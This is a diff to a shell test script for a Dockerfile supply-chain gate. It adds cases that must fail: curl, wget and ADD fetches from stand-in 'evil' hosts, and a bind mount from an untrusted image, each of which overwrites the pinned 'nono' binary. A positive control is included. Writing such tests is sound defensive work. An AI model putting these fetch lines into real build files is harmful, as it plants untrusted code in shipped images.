@@ -214,6 +214,59 @@ COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
 EOF
 run_case "digest-pinned-control" pass "$d"
 
+# ── 14. RUN pulls a nono tarball into the shipped binary path (Sherlock B1) ──
+d="$(mk run-curl-fetch)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+RUN curl -fsSL https://codeload.github.com/evil/nono/tar.gz/stable-x | tar xz -C /usr/local/bin
+EOF
+} >"$d/docker/Dockerfile"
+run_case "run-curl-fetch" fail "$d"
+
+# ── 15. RUN --mount=type=bind,from=<image> (COPY --from in RUN position) ────
+d="$(mk run-mount-from-image)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+RUN --mount=type=bind,from=evil/nono:latest,target=/s cp /s/nono /usr/local/bin/nono
+EOF
+} >"$d/docker/Dockerfile"
+run_case "run-mount-from-image" fail "$d"
+
+# ── 16. ADD --checksum=<url> — a flag between ADD and the URL (Sherlock B3) ──
+d="$(mk add-checksum-url)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+ADD --checksum=sha256:1111111111111111111111111111111111111111111111111111111111111111 https://codeload.github.com/evil/nono/tar.gz/stable-x /tmp/n.tgz
+EOF
+} >"$d/docker/Dockerfile"
+run_case "add-checksum-url" fail "$d"
+
+# ── 17. Heredoc RUN body carrying the same fetch primitive ───────────────────
+d="$(mk run-heredoc-fetch)"; good_pin "$d"
+{ good_stage; cat <<'OUTER'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+RUN <<'EOF'
+wget -qO /usr/local/bin/nono https://evil.example/nono-bin
+EOF
+OUTER
+} >"$d/docker/Dockerfile"
+run_case "run-heredoc-fetch" fail "$d"
+
+# ── 18. Positive: RUN --mount from the pinned stage must still pass ─────────
+# Proves rule 7b is not "reject all mounts".
+d="$(mk run-mount-pinned-control)"; good_pin "$d"
+{ good_stage; cat <<'EOF'
+FROM node:24-bookworm-slim AS base
+COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
+RUN --mount=type=bind,from=nono-builder,target=/m true
+EOF
+} >"$d/docker/Dockerfile"
+run_case "run-mount-pinned-control" pass "$d"
+
 # ── Regression guard: the CI workflow must still invoke the gate ─────────────
 if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
   printf 'PASS  %-26s test.yml invokes check-nono-pin.sh\n' "workflow-invokes-gate"; npass=$((npass + 1))
